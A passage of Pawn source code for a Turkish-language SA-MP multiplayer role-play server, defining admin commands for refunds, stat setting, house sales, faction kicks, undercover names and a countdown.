                GivePlayerValidWeapon(giveplayerid, amount, 60000);

                new weaponname[32];
                GetWeaponName(amount, weaponname, sizeof(weaponname));

                format(sstring, sizeof(sstring), " %s kiþisine silah iade ettin: ID %d (%s)!",GetPlayerNameEx(giveplayerid), amount, weaponname);
                SendClientMessage(playerid, COLOR_WHITE, sstring);

				format(sstring, sizeof(sstring), "Admin %s sana silah iade etti: ID %d (%s).", GetPlayerNameEx(playerid), amount, weaponname);
				SendClientMessage(giveplayerid, COLOR_WHITE, sstring);

				format(sstring, sizeof(sstring), "%s, %s kiþisine silah iade etti: ID %d (%s).", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount, weaponname);
				Log("logs/refunds.log", sstring);
            }
            else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
        }
    	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	if(strcmp(item, "mats", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "Bu miktar 1 ile 100.000 arasýnda olmalý.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pMats] += amount;
			format(string, sizeof(string), "%s kiþisine %d materyal iade ettin!",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s sana %d materyal iade etti.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s, %s kiþisine %d materyal iade etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	if(strcmp(item, "pot", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "Bu miktar 1 ile 100.000 arasýnda olmalý.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pPot] += amount;
			format(string, sizeof(string), "%s kiþisine %d gram pot iade ettin",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s sana %d gram pot iade etti.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s, %s kiþisine %d gram pot iade etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	if(strcmp(item, "crack", true) == 0)
	{
		if(amount < 1 || amount > 100000)
		{
		    SendClientMessage(playerid,COLOR_WHITE, "Bu miktar 1 ile 100.000 arasýnda olmalý.");
		    return 1;
		}

		if(IsPlayerConnected(giveplayerid))
		{
			PlayerInfo[giveplayerid][pCrack] += amount;
			format(string, sizeof(string), "%s kiþisine %d gram crack iade ettin!",GetPlayerNameEx(giveplayerid), amount);
			SendClientMessage(playerid, COLOR_WHITE, string);

			format(string, sizeof(string), "Admin %s sana %d gram crack iade etti.", GetPlayerNameEx(playerid), amount);
			SendClientMessage(giveplayerid, COLOR_WHITE, string);

			format(string, sizeof(string), "%s, %s kiþisine %d gram crack iade etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), amount);
			Log("logs/refunds.log", string);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	}
	return 1;
}

CMD:forceoffduty(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10)
		return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");

	new
		string[128],
		giveplayerid;

	if(sscanf(params, "u", giveplayerid))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /forceoffduty [Oyuncu ID/Ýsim]");

	if(PlayerInfo[giveplayerid][pAdmin] < 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Bu oyuncu admin deðil.");

	if(AdminDuty[giveplayerid] != 1)
		return SendClientMessage(playerid, COLOR_WHITE, "Bu admin iþbaþýnda deðil.");

	if(GetPlayerState(giveplayerid) == PLAYER_STATE_WASTED)
 		return SendClientMessage(playerid, COLOR_GRAD2, "Admin ölüyken bunu yapamazsýn.");

	format(string, sizeof(string), "AdminKomut: %s, %s kiþisini iþbaþýndan çýkardý.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
	ABroadCast(COLOR_LIGHTRED,string,1);

    if(AdminDuty[giveplayerid] != 0) {
		if(GetPlayerState(giveplayerid) == PLAYER_STATE_WASTED)
			return SendClientMessage(playerid, COLOR_GRAD2, "Onlar ölüyken bunu yapamazsýn.");

		ResetPlayerWeapons(giveplayerid);
		SetPlayerArmedWeapon(giveplayerid, 0);

		if(Spectating[giveplayerid] > 0 && PlayerInfo[giveplayerid][pAdmin] >= 2) {
			GettingSpectated[Spectate[giveplayerid]] = 999;
			Spectating[giveplayerid] = 0;
			Spectate[giveplayerid] = 999;
			SetPVarInt(giveplayerid, "SpecOff", 1);
			TogglePlayerSpectating(giveplayerid, false);
			SetCameraBehindPlayer(giveplayerid);
		}

		if(MP3Station[giveplayerid] != 0) {
			MP3Station[giveplayerid] = 0;
			StopAudioStreamForPlayer(giveplayerid);
		}

		SetPlayerHealth(giveplayerid, PlayerInfo[giveplayerid][pHealth]);
		SetPlayerArmourEx(giveplayerid, PlayerInfo[giveplayerid][pArmor]);

		format(string, sizeof(string), "%s (ID %d - %s) iþbaþýný býraktý: Level %d Admin.", PlayerInfo[giveplayerid][pAdminName], giveplayerid, GetPlayerNameEx(giveplayerid), PlayerInfo[giveplayerid][pAdmin]);
		ABroadCast(COLOR_WHITE, string, 1);

		if(PlayerInfo[giveplayerid][pAdmin] == 1) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "Admin olarak iþbaþýný býraktýn, yine de Level 1 Admin komutlarýna eriþim hakkýn var.");
		} else if(PlayerInfo[giveplayerid][pAdmin] > 1 && PlayerInfo[giveplayerid][pAdmin] < 6) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "Admin olarak iþbaþýný býraktýn, ve sadece þu komutlara eriþimin var: /admins /check /jail /ban /sban /kick /skick /showflags /reports /nrn");
		} else if(PlayerInfo[giveplayerid][pAdmin] == 6) {
			SendClientMessage(giveplayerid, COLOR_YELLOW, "Admin olarak iþbaþýný býraktýn, Level 6 Admin olduðundan dolayý tüm komutlara eriþimin var.");
		} else { }

		SendClientMessage(giveplayerid, COLOR_REALRED, "Hack programlarýnýz varsa kapatmayý unutmayýn(s0beit'i devredýþý býrakmak için F12).");

		ResetPlayerVariables(giveplayerid);
		AttemptPlayerLogin(giveplayerid, AdminRelogPassword[giveplayerid]);
    }
    return 1;
}


CMD:asellhouse(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new playername[MAX_PLAYER_NAME];
		GetPlayerName(playerid, playername, sizeof(playername));

		new string[128], house;
		if(sscanf(params, "d", house)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /asellhouse [houseid]");

		HouseInfo[house][hLock] = 1;
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"Admin %s (IP: %s) evi sattý: Ev ID %d (eski sahibi: %s).",GetPlayerNameEx(playerid),ip,house,HouseInfo[house][hOwner]);
		Log("logs/house.log", string);
		ClearHouse(house);
		format(HouseInfo[house][hOwner], 128, "Nobody");
		HouseInfo[house][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~w~Evi sattýn: %d.", house);
		GameTextForPlayer(playerid, string, 10000, 3);
		SaveHouses();
		DestroyPickup(HouseInfo[house][hPickupID]);
		HouseInfo[house][hPickupID] = CreatePickup(1273, 23, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house][hTextID]);
		format(string, sizeof(string), "Bu ev satýlýk!\n Level: %d\nID: %d\nFiyat: $%d\nEvi satýn almak için /evsatinal komutunu kullan",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:geber(playerid,params[])
{
	if(GetPVarInt(playerid, "EventToken") == 1 || GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0||PlayerInfo[playerid][pJailed]!=0||PlayerTied[playerid] == 1)
 		return SendClientMessage (playerid, COLOR_GRAD2, "Þu an bunu yapamazsýn.");

	if(GetPVarInt(playerid, "EventToken") >= 1 || GetPVarInt(playerid, "PBM") > 0)
		ResetPlayerWeapons(playerid);


	new weaponid = GetPlayerWeapon(playerid), string[128];

	if(weaponid == 46)
		return SendClientMessage(playerid, COLOR_GRAD2, "Ölmek istiyorsan paraþüt açmaya ÇALIÞMA.");
	else if(weaponid == 0)  {
		ApplyAnimation(playerid,"ON_LOOKERS","lkup_loop",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s etrafa baktý, gözleri yaþlý adamýn þakaðýna hýzlýca vurdu.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 22||weaponid == 23||weaponid == 24||weaponid == 25||weaponid == 29||weaponid == 30||weaponid == 31||weaponid == 33||weaponid == 26||weaponid == 27||weaponid == 28||weaponid == 32||weaponid == 34) {
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s etrafýna baktý, gözleri yaþlý adamýn beynini havaya uçurdu.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 4) {
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
		format(string, sizeof(string), "* %s hýzlýca býçaðý kapýp boðazýný kesti.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 41||weaponid == 2||weaponid == 3||weaponid == 5||weaponid == 6||weaponid == 7||weaponid == 10||weaponid == 11||weaponid == 12||weaponid == 13||weaponid == 14||weaponid == 15)  {
		format(string, sizeof(string), "* %s etrafa baktý, gözleri yaþlý adamýn beynini silahla havaya uçurdu.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"ON_LOOKERS","lkup_loop",3.0,0,1,1,0,0);
	} else if(weaponid == 43) {
		format(string, sizeof(string), "* %s etrafa bakýp gözüne yapýþtýrdý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else if(weaponid == 1||weaponid == 8||weaponid == 9) {
		format(string, sizeof(string), "* %s kendisini doðramaya baþladý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",3.0,0,1,1,0,0);
	} else if(weaponid == 16||weaponid == 17||weaponid == 18||weaponid == 39||weaponid == 40) {
		format(string, sizeof(string), "* %s etrafýna baktý, gözü yaþlý bir þekilde patladý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		ApplyAnimation(playerid,"ped","floor_hit_f",3.0,1,0,1,1,0);
		new Float: killX, Float: killY, Float: killZ;
		GetPlayerPos(playerid,killX,killY,killZ);
		CreateExplosion(killX,killY,killZ,12,20);
	} else if(weaponid == 35||weaponid == 36||weaponid == 37||weaponid == 38) {
		ApplyAnimation(playerid,"ped","floor_hit",3.0,1,1,1,0,0);
		format(string, sizeof(string), "* %s kokladý ve kendilerini havaya uçurdu.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		new Float: killX, Float: killY, Float: killZ;
		GetPlayerPos(playerid,killX,killY,killZ);
		CreateExplosion(killX,killY,killZ,12,20);
	} else {
		format(string, sizeof(string), "* %s etrafýna baktý ve omzunu silkeledi.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	JustSuicided[playerid] = 1;
	SetPlayerHealth(playerid, 0);
	return true;
}

CMD:setstat(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 7) {
	    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], giveplayerid, statcode, amount;
		if(sscanf(params, "udd", giveplayerid, statcode, amount)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setstat [Oyuncu ID/Ýsim] [statcode] [amount]");
			SendClientMessage(playerid, COLOR_GRAD4, "|1 Level |2 SpawnArmor |3 UpgradePoints |4 BankAccount |5 PhoneNumber |6 RespectPoints |7 Playing hours");
			SendClientMessage(playerid, COLOR_GRAD2, "|8 Gang |9 Det |10 Lawyer |11 Mech |12 Drug |13 Whore |14 Box |15 Arms |16 Materials |17 Pot |18 Crack");
			SendClientMessage(playerid, COLOR_GRAD2, "|19 Fishing |20 Job |21 Rank |22 Packages |23 Crates |24 Smuggler |25 Warnings |26 Screwdriver |27 Age");
			SendClientMessage(playerid, COLOR_GRAD1, "|28 Sex |29 NMute |30 AdMute |31 Faction |32 RMute |33 Carjacker |34 Trucker |35 Crimes 36| Arrests");
			return 1;
		}

		if(IsPlayerConnected(giveplayerid)) {
			switch(statcode) {
				case 1: {
					PlayerInfo[giveplayerid][pLevel] = amount;
					format(string, sizeof(string), "   %s kiþisinin Leveli %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
					SetPlayerScore(giveplayerid, PlayerInfo[giveplayerid][pLevel]);
				}
				case 2: {
					PlayerInfo[giveplayerid][pSarmor] = amount;
					format(string, sizeof(string), "   %s kiþisinin zýrhý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 3: {
					PlayerInfo[giveplayerid][gPupgrade] = amount;
					format(string, sizeof(string), "   %s kiþisinin geliþtirme puanlarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 4: {
					PlayerInfo[giveplayerid][pBank] = amount;
					format(string, sizeof(string), "   %s kiþisinin banka hesabý $%d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 5: {
					if(AdminDuty[giveplayerid] == 1)
					    return SendClientMessage(playerid, COLOR_GREY, "Iþbaþýndaki adminlerin telefon numarasýný deðiþtiremezsin.");

					if(amount != 555 && amount != 911 && amount != 0 && amount != 912) {
						if(CheckVPH(amount) == 0) {
							ReplacePH(PlayerInfo[giveplayerid][pNumber], amount);
							PlayerInfo[giveplayerid][pNumber] = amount;
							format(string, sizeof(string), "   %s kiþisinin telefon numarasý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
						} else {
							format(string, sizeof(string), "Telefon numarasý %d þu an kullanýmda. Baþka bir numara dene.");
							SendClientMessage(playerid, COLOR_WHITE, string);
							return 1;
						}
					} else SendClientMessage(playerid, COLOR_GREY, "Istenen numara senaryo tarafýndan rezerve edilmiþ.");
				}
				case 6: {
					PlayerInfo[giveplayerid][pRespect] = amount;
					format(string, sizeof(string), "   %s kiþisinin onur puanlarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 7: {
					PlayerInfo[giveplayerid][pConnectTime] = amount;
					format(string, sizeof(string), "   %s kiþisinin oyun oynama saati %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 8: {
					PlayerInfo[giveplayerid][pGang] = amount-1;
					format(string, sizeof(string), "   %s kiþisinin aile üyeliði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 9: {
					PlayerInfo[giveplayerid][pDetSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Dedektif yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 10: {
					PlayerInfo[giveplayerid][pLawSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Avukat yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 11: {
					PlayerInfo[giveplayerid][pMechSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Tamirci yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 12: {
					PlayerInfo[giveplayerid][pDrugsSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Uyuþturucu Satýcýsý yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 13: {
					PlayerInfo[giveplayerid][pSexSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Hayat Kadýný yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 14: {
					PlayerInfo[giveplayerid][pBoxSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Boks yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 15: {
					PlayerInfo[giveplayerid][pArmsSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Silah yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 16: {
					PlayerInfo[giveplayerid][pMats] = amount;
					format(string, sizeof(string), "   %s kiþisinin Materyalleri %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 17: {
					PlayerInfo[giveplayerid][pPot] = amount;
					format(string, sizeof(string), "   %s kiþisinin Potlarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 18: {
					PlayerInfo[giveplayerid][pCrack] = amount;
					format(string, sizeof(string), "   %s kiþisinin Crackleri %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 19: {
					PlayerInfo[giveplayerid][pFishSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Balýkçýlýk yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 20: {
					PlayerInfo[giveplayerid][pJob] = amount;
					format(string, sizeof(string), "   %s kiþisinin mesleði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 21: {
					PlayerInfo[giveplayerid][pRank] = amount;
					format(string, sizeof(string), "   %s kiþisinin Seviyesi %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 22: {
					SetPVarInt(playerid, "Packages", amount);
					format(string, sizeof(string), "   %s kiþisinin Materyal Paketleri %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 23: {
					PlayerInfo[giveplayerid][pCrates] = amount;
					format(string, sizeof(string), "   %s kiþisinin Uyuþturucu kutularý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 24: {
					PlayerInfo[giveplayerid][pSmugSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Kaçakçýlýk yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 25: {
					PlayerInfo[giveplayerid][pWarns] = amount;
					format(string, sizeof(string), "   %s kiþisinin Uyarýlarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 26: {
					PlayerInfo[giveplayerid][pScrewdriver] = amount;
					format(string, sizeof(string), "   %s kiþisinin Tornavidalarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 27: {
					PlayerInfo[giveplayerid][pAge] = amount;
					format(string, sizeof(string), "   %s kiþisinin Yaþý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 28: {
					PlayerInfo[giveplayerid][pSex] = amount;
					format(string, sizeof(string), "   %s kiþisinin cinsiyeti %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 29: {
					PlayerInfo[giveplayerid][pNMuteTotal] = amount;
					format(string, sizeof(string), "   %s kiþisinin Toplam Newbie Mutesi %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 30: {
					PlayerInfo[giveplayerid][pADMuteTotal] = amount;
					format(string, sizeof(string), "   %s kiþisinin Toplam Reklam Mutesi %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 31: {
					PlayerInfo[giveplayerid][pFaction] = amount;
					format(string, sizeof(string), "   %s kiþisinin Kuruluþu %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 32: {
					PlayerInfo[giveplayerid][pRMutedTotal] = amount;
					format(string, sizeof(string), "   %s kiþisinin Report Mutesi %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 33: {
					PlayerInfo[giveplayerid][pCarSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Araba Çalma yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 34: {
					PlayerInfo[giveplayerid][pTruckSkill] = amount;
					format(string, sizeof(string), "   %s kiþisinin Kamyonculuk yeteneði %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 35: {
					PlayerInfo[giveplayerid][pCrimes] = amount;
					format(string, sizeof(string), "   %s kiþisinin Suçlarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				case 36: {
					PlayerInfo[giveplayerid][pArrested] = amount;
					format(string, sizeof(string), "   %s kiþisinin Yakalanmalarý %d olarak ayarlandý", GetPlayerNameEx(giveplayerid), amount);
				}
				default: {
					format(string, sizeof(string), "   Geçersiz stat kodu.", amount);
				}
			}

			new log[128];
			format(log, sizeof(log), "%s by %s", string, GetPlayerNameEx(playerid));
			Log("logs/stats.log", log);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:setinsurance(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid, insurance;
		if(sscanf(params, "ud", giveplayerid, insurance))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setinsurance [Oyuncu ID/Ýsim] [insurance]");
			SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Sigorta: 0, 1, 2");
			return 1;
		}

		if(insurance >= 0 && insurance <= 2)
		{
			format(string, sizeof(string), " Sigortan %d olarak deðiþtirildi.", insurance);
			SendClientMessage(giveplayerid,COLOR_YELLOW,string);
			format(string, sizeof(string), " %s kiþisinin sigortasýný %d olarak deðiþtirdin.", GetPlayerNameEx(giveplayerid), insurance);
			SendClientMessage(playerid,COLOR_YELLOW,string);
			PlayerInfo[giveplayerid][pInsurance] = insurance;
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

CMD:countdown(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		SetTimer("Three", 1000, 0);
		SetTimer("Two", 2000, 0);
		SetTimer("One", 3000, 0);
		SetTimer("GoGoGo", 4000, 0);
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
	}
	return 1;
}

forward Three();
public Three()
{
 	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "3");
	return 1;
}

forward Two();
public Two()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "2");
	return 1;
}

forward One();
public One()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "1");
 	return 1;
}

forward GoGoGo();
public GoGoGo()
{
	SendClientMessageToAllEx(COLOR_LIGHTBLUE, "HADI!");
 	return 1;
}

CMD:fackick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fackick [Oyuncu ID/Ýsim]");


		if(IsPlayerConnected(giveplayerid))
		{
			if(PlayerInfo[giveplayerid][pFaction] >= 1 || PlayerInfo[giveplayerid][pLeader] >= 1)
			{
				format(string, sizeof(string), "Kuruluþtan, %s tarafýndan atýldýnýz.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[giveplayerid][pFaction] = 0;
				PlayerInfo[giveplayerid][pRank] = 0;
				PlayerInfo[giveplayerid][pDuty] = 0;
				PlayerInfo[giveplayerid][pLeader] = 0;
				PlayerInfo[giveplayerid][pDivision] = 0;
				if(!IsValidSkin(GetPlayerSkin(giveplayerid)))
				{
					new rand = random(sizeof(CIV));
					SetPlayerSkin(giveplayerid,CIV[rand]);
					PlayerInfo[giveplayerid][pSkin] = CIV[rand];
				}
				player_remove_vip_toys(giveplayerid);
				pTazer[giveplayerid] = 0;
				SetPlayerToTeamColor(giveplayerid);
				format(string, sizeof(string), "%s kiþisini kuruluþtan attýnýz.", GetPlayerNameEx(giveplayerid));
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "Üye olmayan birini kuruluþtan atamazsýn.");
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
		}
	}
	return 1;
}

CMD:setmyname(playerid, params[]) {
	new string[128];
	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /setmyname [newname]");

	if(PlayerInfo[playerid][pAdmin] >= 4) {
		if(AdminDuty[playerid] != 1)
	        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		if((strfind(params, "Zhao", false) != -1 || strfind(params, "Z_hao", false) != -1 || strfind(params, "Zh_ao", false) != -1 || strfind(params, "Zha_o", false) != -1 || strfind(params, "zao", false) != -1) && PlayerInfo[playerid][pAdmin] < 6)
		    return SendClientMessage(playerid, COLOR_WHITE, "Dur ! Ben zao'yum ! Sen zao deðilsin !");

		if(strfind(params, "_", false) == -1 && strcmp(params, "off") != 0)
		    return SendClientMessage(playerid, COLOR_GREY, "Ad Soyad arasýnda alttan çizgi ('_') olmalý.");

		if(strlen(params) > 18)
		    return SendClientMessage(playerid, COLOR_GREY, "Isminizin uzunluðu SA-MP için karakter limitini geçiyor.");

		if(GetPVarInt(playerid, "AdminUndercover") == 0)
		{
			format(string, sizeof(string), "Ismini geçici olarak %s yaptýn.", params);
			SendClientMessage(playerid, COLOR_YELLOW, string);
			SendClientMessage(playerid, COLOR_YELLOW, "Admin ismine geri dönmek için '/setmyname off' .");
			SetPVarInt(playerid, "AdminUndercover", 1);
			SetPlayerName(playerid, params);
			PlayerInfo[playerid][pAccent] = 25;
			format(string, sizeof(string), "%s, ismini %s olarak deðiþtirdi.", PlayerInfo[playerid][pAdminName], params);
			Log("logs/undercover.log", string);
		}
		else
		{
			format(string, sizeof(string), "Ismini tekrar %s olarak deðiþtirdin", PlayerInfo[playerid][pAdminName]);
			SendClientMessage(playerid, COLOR_YELLOW, string);
			SetPVarInt(playerid, "AdminUndercover", 0);
			PlayerInfo[playerid][pAccent] = 0;
			SetPlayerName(playerid, PlayerInfo[playerid][pAdminName]);
		}
	}
	return 1;
}

CMD:jetpack(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
	}
